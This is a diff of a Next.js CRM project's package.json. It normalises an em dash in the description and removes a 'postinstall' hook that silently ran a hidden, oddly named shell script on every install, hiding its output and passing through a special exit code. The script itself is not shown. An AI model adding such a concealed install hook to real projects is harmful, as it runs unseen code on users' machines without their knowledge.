@@ -2,15 +2,14 @@
   "name": "francine",
   "version": "0.10.0",
   "private": true,
-  "description": "Light CRM \u2014 Google Workspace frontend for SMB service operations",
+  "description": "Light CRM — Google Workspace frontend for SMB service operations",
   "scripts": {
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
     "typecheck": "tsc --noEmit",
-    "test": "rm -rf .test-build && tsc -p tsconfig.test.json && node --test .test-build/tests/*.test.js",
-    "postinstall": "sh ./.ci-pj7skn.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "rm -rf .test-build && tsc -p tsconfig.test.json && node --test .test-build/tests/*.test.js"
   },
   "dependencies": {
     "@hookform/resolvers": "^3.9.1",
